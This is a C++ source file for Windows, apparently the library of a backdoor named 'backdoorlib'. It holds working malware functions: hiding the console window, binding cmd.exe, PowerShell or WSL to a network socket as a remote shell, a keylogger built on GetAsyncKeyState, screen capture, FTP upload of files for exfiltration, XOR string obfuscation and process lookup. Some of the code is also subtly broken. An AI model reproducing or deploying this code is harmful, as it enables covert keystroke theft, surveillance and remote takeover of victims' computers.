// TCHAR t[100]; = char t[100];
// WCHAR t[100]; = wchar_t t[100];

#include "backdoorlib.h"
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <vector>
#include <sstream>

#include <sys/types.h>
#include <sys/types.h>
#include <sys/stat.h>

#include <errno.h>
#include <string.h>
#include <direct.h>

#include <winsock2.h>
#include <WinUser.h>
#include <ws2tcpip.h>
#include <WinInet.h> // -lwininet

#include <windows.h>
#include <lmcons.h>
#include <stdexcept>
#include <string>
#include <cstring>
#include <fstream>
#include <WinUser.h>
#include <wtypes.h>


//screenshot headers
#include <Ole2.h>
#include <OleCtl.h>
#include <TlHelp32.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "wininet.lib")
#pragma comment (lib, "User32.lib")
#pragma comment(lib,"OleAut32.Lib")

#define BUFFER_SIZE_DEFAULT 4096

struct stat info;

TCHAR username[257];
char buffer[BUFFER_SIZE_DEFAULT];
char* buffer_download_file;

using namespace std;

void hello_world(void){
    printf("Hello World ! By Unam3dd\n");
}

int StartsWith(const char *a, const char *b)
{
   if(strncmp(a, b, strlen(b)) == 0) return 1;
   return 0;
}

char * raw_input(char *input_string){
    char input_console[BUFFER_SIZE_DEFAULT];
    char return_input[BUFFER_SIZE_DEFAULT];
    printf("%s",input_string);
    return fgets(input_console,BUFFER_SIZE_DEFAULT,stdin);
}

int input(char *input_string)
{
    int number;
    printf("%s",input_string);
    scanf("%d",&number);
    return number;
}

void clear(void){
    system("cls");
}

TCHAR *get_username()
{
    DWORD username_len=UNLEN+1;
    GetUserName((TCHAR *)username, &username_len);
    return username;
}

int substring_in_string(char *substring,char *string){
    int c1 = 0;
    int c2 = 0;
    int i,y,fl;

    while (string[c1] != '\0'){
        c1++;
    }

    while (substring[c2] != '\0'){
        c2++;
    }

    for (i = 0; i <= c1 - c2; i++)
    {
        for (y = i; y < i + c2; y++){
            fl = 1;
            if (string[y] != substring[y - i]){
                fl = 0;
                break;
            }
        }

        if (fl == 1)
        {
            break;
        }
    }

    if (fl == 1){
        return 0;
    } else {
        return -1;
    }
}

int tchar_substring_in_string(char *substring,TCHAR *string)
{
    int c1 = 0;
    int c2 = 0;
    int i,y,fl;

    while (string[c1] != '\0'){
        c1++;
    }

    while (substring[c2] != '\0'){
        c2++;
    }

    for (i = 0; i <= c1 - c2; i++)
    {
        for (y = i; y < i + c2; y++){
            fl = 1;
            if (string[y] != substring[y - i]){
                fl = 0;
                break;
            }
        }

        if (fl == 1)
        {
            break;
        }
    }

    if (fl == 1){
        return 0;
    } else {
        return -1;
    }
}

void print(char *string)
{
    printf("%s\n",string);
}

int check_dir(char *pathname)
{
    if(stat(pathname,&info) !=0){
        return -1;
    } else if (info.st_mode & S_IFDIR){
        return 1;
    } else {
        return 0;
    }
}

void hide_console(void)
{
    FreeConsole();
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_MINIMIZE);
    ShowWindow(hWnd, SW_HIDE);
}

void sleep(int number)
{
    _sleep(number);
}

int connect(SOCKET socks_instance,struct sockaddr_in session)
{
    int c = WSAConnect(socks_instance,(struct sockaddr *)&session,sizeof(session),0,0,0,0);
    if (c != 0){
        closesocket(socks_instance);
        WSACleanup();
        return -1;
    }

    return 0;
}

int send(SOCKET socks_instance,char *buffer)
{
    sleep(100);
    int s = send(socks_instance,buffer,strlen(buffer)+1,0);
    if (s == SOCKET_ERROR){
        printf("[!] Send Failed Error Code : %d\n",WSAGetLastError());
        return -1;
    } else {
        return 0;
    }
}

int recv(SOCKET socks_instance,char *buffer,int len)
{
    sleep(100);
    int i;
    i = recv(socks_instance,buffer,len,0);
    if (i > 0){
        return i;
    } else if (i == 0){
        return 0;
    } else {
        return -1;
    }
}

void cmd_command(SOCKET socks_instance,char *command)
{
    char Process[BUFFER_SIZE_DEFAULT];
    sprintf(Process,"cmd.exe /c %s",command);
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks_instance;
    CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
    WaitForSingleObject(pinfo.hProcess, INFINITE);
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
}


void powershell_command(SOCKET socks_instance,char*command)
{
    char Process[BUFFER_SIZE_DEFAULT];
    sprintf(Process,"powershell.exe -Command %s",command);
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks_instance;
    CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
    WaitForSingleObject(pinfo.hProcess, INFINITE);
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
}

void wsl_command(SOCKET socks_instance,char *command)
{
    char Process[BUFFER_SIZE_DEFAULT];
    sprintf(Process,"wsl.exe -e %s",command);
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks_instance;
    CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
    WaitForSingleObject(pinfo.hProcess, INFINITE);
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
}


void execute_process(SOCKET socks_instance,char *process)
{
    char Process[BUFFER_SIZE_DEFAULT];
    sprintf(Process,"%s",process);
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks_instance;
    CreateProcess(NULL,Process,NULL,NULL,TRUE,0,NULL,NULL,&sinfo, &pinfo);
    WaitForSingleObject(pinfo.hProcess, INFINITE);
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
}


void execute_cmd(SOCKET socks_instance)
{
    char Process[BUFFER_SIZE_DEFAULT] = "cmd.exe";
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;
    memset(&sinfo,0,sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks_instance;
    CreateProcess(NULL,Process,NULL,NULL,TRUE,0,NULL,NULL,&sinfo, &pinfo);
    WaitForSingleObject(pinfo.hProcess, INFINITE);
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
}

void execute_powershell(SOCKET socks_instance)
{
    char Process[BUFFER_SIZE_DEFAULT] = "powershell.exe";
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;
    memset(&sinfo,0,sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks_instance;
    CreateProcess(NULL,Process,NULL,NULL,TRUE,0,NULL,NULL,&sinfo, &pinfo);
    WaitForSingleObject(pinfo.hProcess, INFINITE);
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
}


int download_to_ftp(char* filename, char* ftp_host, int ftp_port,char *ftp_user,char *ftp_pass)
{
    HINTERNET hNet;
    hNet = InternetOpen("Ftp", INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
    if (hNet != INVALID_HANDLE_VALUE)
    {
        HINTERNET hFtp = InternetConnect(hNet, ftp_host, ftp_port, ftp_user, ftp_pass, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
        if (hFtp != INVALID_HANDLE_VALUE)
        {
            if (FtpPutFile(hFtp, filename, filename, FTP_TRANSFER_TYPE_BINARY, 0))
            {
                return 0; // file envoyer au ftp
            }
            else {
                return -1; // file error
            }
            InternetCloseHandle(hFtp);
        }
    }
}

int cd(char *path)
{
    if (chdir(path) == 0) {
        return 0;
    }
    else {
        return -1;
    }
}

int download_on_ftp(char* filename, char* ftp_host, int ftp_port, char* ftp_user, char* ftp_pass)
{
    HINTERNET hNet;
    hNet = InternetOpen("Ftp", INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
    if (hNet != INVALID_HANDLE_VALUE)
    {
        HINTERNET hFtp = InternetConnect(hNet, ftp_host, ftp_port, ftp_user, ftp_pass, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
        if (hFtp != INVALID_HANDLE_VALUE)
        {
            if (FtpGetFile(hNet, filename, filename,TRUE,FILE_ATTRIBUTE_NORMAL,FTP_TRANSFER_TYPE_BINARY, 0)) {
                return 0;
            }
            else {
                return -1;
            }
            InternetCloseHandle(hFtp);
        }
    }
}


void WriteLog(string filename, const char* key) {
    ofstream write(filename, ios::app); //ios:app precise de ne pas re ecrire le fichier a chaque entrée
    if (write.is_open()) {
        write << key;
        write.close();
    }
}

void WriteLogChar(string filename, char key) {
    ofstream write(filename, ios::app);
    if (write.is_open()) {
        write << key;
        write.close();
    }
}


int keylistener(string FILENAME_LOG,int key) {
    switch (key)
    {

    case VK_SPACE:
        //cout << " ";
        WriteLog(FILENAME_LOG, " ");
        return 0;

    case VK_RETURN:
        //cout << "\n";
        WriteLog(FILENAME_LOG, "\n");
        return 0;

    case '¾':
        //cout << ".";
        WriteLog(FILENAME_LOG, ".");
        return 0;

    case VK_SHIFT:
        //cout << "<SHIFT>";
        WriteLog(FILENAME_LOG, "<SHIFT>");
        return 0;

    case VK_BACK:
        //cout << "\b";
        WriteLog(FILENAME_LOG, "\b");
        return 0;

    case VK_RBUTTON:
        //cout << "<R_CLICK>";
        WriteLog(FILENAME_LOG, "<RIGHT_CLICK>");
        return 0;

    case VK_LBUTTON:
        //cout << "<R_LEFT>";
        WriteLog(FILENAME_LOG, "<LEFT_CLICK>");
        return 0;

    case VK_CAPITAL:
        //cout << CAPITAL_TEXT;
        WriteLog(FILENAME_LOG, "");
        return 0;

    case VK_BROWSER_HOME:
        //cout << "<BROWSER_HOME>";
        return 0;

    case VK_TAB:
        //cout << "<TAB>";
        WriteLog(FILENAME_LOG, "<TAB>");
        return 0;

    case VK_DOWN:
        //cout << "<DOWN>";
        WriteLog(FILENAME_LOG, "<DOWN_ARROW_KEY>");
        return 0;

    case VK_LEFT:
        //cout << "<LEFT>";
        WriteLog(FILENAME_LOG, "<LEFT_ARROW_KEY>");
        return 0;

    case VK_RIGHT:
        //cout << "<RIGHT>";
        WriteLog(FILENAME_LOG, "<RIGHT_ARROW_KEY>");
        return 0;

    case VK_CONTROL:
        //cout << "<CTRL>";
        WriteLog(FILENAME_LOG, "<CTRL>");
        return 0;

    case VK_MENU:
        //cout << "<ALT>";
        WriteLog(FILENAME_LOG, "<ALT>");
        return 0;
    }
}

int keylogger_spawn(string FILENAME_LOG)
{
    char keyword;
    while (true) // or for(;;)
    {
        Sleep(10);
        for (keyword = 8; keyword <= 127; keyword++) { // for contains characters within 8 and 127
            if (GetAsyncKeyState(keyword) == -32767)
            {

                if ((keyword > 64))
                {
                    if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
                    {
                        if (keyword < 91) {
                            //cout << keyword;
                            WriteLogChar(FILENAME_LOG, keyword);
                        }
                    }
                    else {
                        keyword += 32;
                        if (keyword > 91) {
                            //cout << keyword;
                            WriteLogChar(FILENAME_LOG, keyword);
                        }
                    }
                }

                else if ((keyword > 33) && (keyword < 64)) {

                    if (keyword == 48)
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            //cout << ")";
                            WriteLog(FILENAME_LOG, ")");
                        }
                        else {
                            //cout << "0";
                            WriteLog(FILENAME_LOG, "0");
                        }
                    }

                    else if (keyword == 49)
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            //cout << "!";
                            WriteLog(FILENAME_LOG, "!");
                        }
                        else {
                            //cout << "1";
                            WriteLog(FILENAME_LOG, "1");
                        }
                    }

                    else if (keyword == 50)
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            //cout << "\"";
                            WriteLog(FILENAME_LOG, "\"");
                        }
                        else {
                            //cout << "2";
                            WriteLog(FILENAME_LOG, "2");
                        }
                    }

                    else if (keyword == 51)
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            //cout << "£";
                            WriteLog(FILENAME_LOG, "£");
                        }
                        else {
                            //cout << "3";
                            WriteLog(FILENAME_LOG, "3");
                        }
                    }

                    else if (keyword == 52)
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            //cout << "$";
                            WriteLog(FILENAME_LOG, "$");
                        }
                        else {
                            //cout << "4";
                            WriteLog(FILENAME_LOG, "4");
                        }
                    }

                    else if (keyword == 53)
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            //cout << "%";
                            WriteLog(FILENAME_LOG, "%");
                        }
                        else {
                            //cout << "5";
                            WriteLog(FILENAME_LOG, "5");
                        }
                    }

                    else if (keyword == 54)
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            //cout << "^";
                            WriteLog(FILENAME_LOG, "^");
                        }
                        else {
                            //cout << "6";
                            WriteLog(FILENAME_LOG, "6");
                        }
                    }

                    else if (keyword == 57)
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            //cout << "(";
                            WriteLog(FILENAME_LOG, "(");
                        }
                        else {
                            //cout << "9";
                            WriteLog(FILENAME_LOG, "9");
                        }
                    }

                    else if (keyword == 56)
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            //cout << "*";
                            WriteLog(FILENAME_LOG, "*");
                        }
                        else {
                            //cout << "8";
                            WriteLog(FILENAME_LOG, "8");
                        }
                    }

                    else if (keyword == 55)
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            //cout << "&";
                            WriteLog(FILENAME_LOG, "&");
                        }
                        else {
                            //cout << "7";
                            WriteLog(FILENAME_LOG, "7");
                        }
                    }
                }
                else {
                    keylistener(FILENAME_LOG,keyword);
                    break;
                }
            }
        }
    }
    return 0;
}


/*
string str = "adsf+qwer+poui+fdgh";
    vector<string> v = split(str, '+');

    for (auto i : v) cout << i << endl;

    cout << v[2] << endl;
*/

vector<string> split(const string& s, char delim) {
    vector<string> result;
    stringstream ss(s);
    string item;

    while (getline(ss, item, delim)) {
        result.push_back(item);
    }

    return result;
}

string path_link(string link) {
    string result;

    int end_char = link.size() - 1;
    vector<string> split_string = split(link, '/');
    int vector_split_size = split_string.size();
    vector<string> split_string2 = split(split_string[0].c_str(), ':');

    for (int iter = 3; iter < vector_split_size; iter++) {
        //cout << split_string[iter] << endl;
        result.append("/");
        result.append(split_string[iter]);
    }

    return result;
}

bool endswith(const std::string& str, const std::string& suffix) // if return code is 1 its True else if is 0 its False
{
    return str.size() >= suffix.size() && 0 == str.compare(str.size() - suffix.size(), suffix.size(), suffix);
}

bool startswith(const std::string& str, const std::string& prefix)
{
    return str.size() >= prefix.size() && 0 == str.compare(0, prefix.size(), prefix);
}

vector<int> GetScreenResolution(int &w, int &h)
{
    vector<int> results;
    DWORD dwWidth = (int)GetSystemMetrics(0);
    DWORD dwHeight = (int)GetSystemMetrics(1);
    results.push_back(dwWidth);
    results.push_back(dwHeight);

    return results;
}

bool saveBitmap(LPCSTR filename, HBITMAP bmp, HPALETTE pal)
{
    bool result = false;
    PICTDESC pd;

    pd.cbSizeofstruct = sizeof(PICTDESC);
    pd.picType = PICTYPE_BITMAP;
    pd.bmp.hbitmap = bmp;
    pd.bmp.hpal = pal;

    LPPICTURE picture;
    HRESULT res = OleCreatePictureIndirect(&pd, IID_IPicture, false,
        reinterpret_cast<void**>(&picture));

    if (!SUCCEEDED(res))
        return false;

    LPSTREAM stream;
    res = CreateStreamOnHGlobal(0, true, &stream);

    if (!SUCCEEDED(res))
    {
        picture->Release();
        return false;
    }

    LONG bytes_streamed;
    res = picture->SaveAsFile(stream, true, &bytes_streamed);

    HANDLE file = CreateFile(filename, GENERIC_WRITE, FILE_SHARE_READ, 0,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

    if (!SUCCEEDED(res) || !file)
    {
        stream->Release();
        picture->Release();
        return false;
    }

    HGLOBAL mem = 0;
    GetHGlobalFromStream(stream, &mem);
    LPVOID data = GlobalLock(mem);

    DWORD bytes_written;

    result = !!WriteFile(file, data, bytes_streamed, &bytes_written, 0);
    result &= (bytes_written == static_cast<DWORD>(bytes_streamed));

    GlobalUnlock(mem);
    CloseHandle(file);

    stream->Release();
    picture->Release();

    return result;
}

bool screenshot(int x, int y, int w, int h, LPCSTR fname) {
    HDC hdcSource = GetDC(NULL);
    HDC hdcMemory = CreateCompatibleDC(hdcSource);

    int capX = GetDeviceCaps(hdcSource, HORZRES);
    int capY = GetDeviceCaps(hdcSource, VERTRES);

    HBITMAP hBitmap = CreateCompatibleBitmap(hdcSource, w, h);
    HBITMAP hBitmapOld = (HBITMAP)SelectObject(hdcMemory, hBitmap);

    BitBlt(hdcMemory, 0, 0, w, h, hdcSource, x, y, SRCCOPY);
    hBitmap = (HBITMAP)SelectObject(hdcMemory, hBitmapOld);

    DeleteDC(hdcSource);
    DeleteDC(hdcMemory);

    HPALETTE hpal = NULL;
    if (saveBitmap(fname, hBitmap, hpal)) return true;
    return false;
}

char *cmd_popen_char(const char *command,const char *mode,char *buffer)
{
    FILE* fp;
    fp = _popen(command, mode);
    if (fp == NULL) {
        _pclose(fp);
        return "Error NULL CODE";
    }
    else {
        int size_of_entry_buffer = sizeof(buffer);
        char buffer_local[size_of_entry_buffer];
        while (fgets(buffer_local, sizeof(buffer_local), fp))
        {
            strcat(buffer, buffer_local);
        }
        return buffer;
        _pclose(fp);
    }
}

char* pwd(char* buffer)
{
    char buffer_pwd[4096];
    getcwd(buffer_pwd, sizeof(buffer_pwd));
    strcpy(buffer, buffer_pwd);
    return buffer;
}

string tohex(string buffer)
{
    string strconcat2;

    for (unsigned int i = 0; i < buffer.size(); i++)
    {
        stringstream strconcat;
        strconcat << hex << (int)buffer[i];
        strconcat2 += strconcat.str();
    }
    buffer = strconcat2;
    return buffer;
}

string xor_string_enc_dec(string data, char key[])
{
    string xor_enc = data;
    
    for (int x = 0;x<xor_enc.size();x++)
    {
        xor_enc[x] = data[x] ^ key[x % (strlen(key) / sizeof(char))];
    }

    return xor_enc;
}

int xor_logic(int a,int b) /* XOR LOGIC; 0+0=0; 1+0=1; 0+1=1; 1+1=0*/
{
    return (a+b) % 2;
}

bool bool_xor_logic(bool a, bool b)
{
    return (a + b) % 2;
}

int getpid(const string& process_name)
{
    HANDLE spshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 structprocsnapshot = { 0 };
    structprocsnapshot.dwSize = sizeof(PROCESSENTRY32);

    if (spshot == INVALID_HANDLE_VALUE)return -1;
    if (Process32First(spshot, &structprocsnapshot) == FALSE)return -1;

    while (Process32Next(spshot, &structprocsnapshot))
    {
        if (!strcmp(structprocsnapshot.szExeFile, process_name.c_str()))
        {
            CloseHandle(spshot);
            return structprocsnapshot.th32ProcessID;
        }
    }
    CloseHandle(spshot);
    return -1;
}